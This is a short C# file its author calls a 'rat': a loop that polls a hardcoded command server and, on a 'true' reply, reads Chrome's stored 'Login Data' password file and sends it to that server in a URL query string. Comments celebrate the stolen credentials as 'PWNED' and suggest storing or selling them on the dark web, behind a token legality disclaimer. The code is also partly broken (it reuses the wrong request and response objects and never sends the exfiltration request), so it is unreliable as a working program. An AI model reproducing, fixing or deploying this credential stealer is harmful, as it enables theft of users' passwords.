using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;

namespace ServerConnect
{
    public class Class1
    {
        // This rat has been coded by me, change stuff
        // for yourself and remember! doing this on
        // a PC thats NOT yours or you didn't get 
        // permission from is illegal!

        string server = "http://phpgatewaycooldennylol.subdomain.org"; // Your server name and directory, file name for the file we will process
        string chromePasswords = "C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"; // Define chrome passwords

        
        private void MyFunction()
        {
            while (true)
            {
                var request = WebRequest.Create(server);

                request.Method = "GET";

                var response = request.GetResponse();
                var responseStream = response.GetResponseStream();

                var reader = new StreamReader(responseStream);
                var data = reader.ReadToEnd();

                // data is now initilised. We can now simply get what we want to do with the
                // request.

                if (data == "<html>true</html>") // If the HTML = true meaning that you want chrome passwords to be pwned then:
                {
                    // 
                    var passwords = File.ReadAllText(chromePasswords);
                    var AnotherRequest = WebRequest.Create(server + "?chromeData=" + passwords);

                    AnotherRequest.Method = "GET";

                    var responseX = request.GetResponse();
                    var responseStreamX = response.GetResponseStream();

                    var readerX = new StreamReader(responseStream);
                    var dataX = reader.ReadToEnd();

                    if (dataX == "<html>success</html>")
                    {
                        // The person's credintials has been PWNED. do something
                        // such as store data on a database to use later
                        // or use store it on the dark web, its your choice.

                        // GET is not secure so you might wanna tweak the
                        // code so its POST.
                    }
                }

            }
        }

        
    }
}
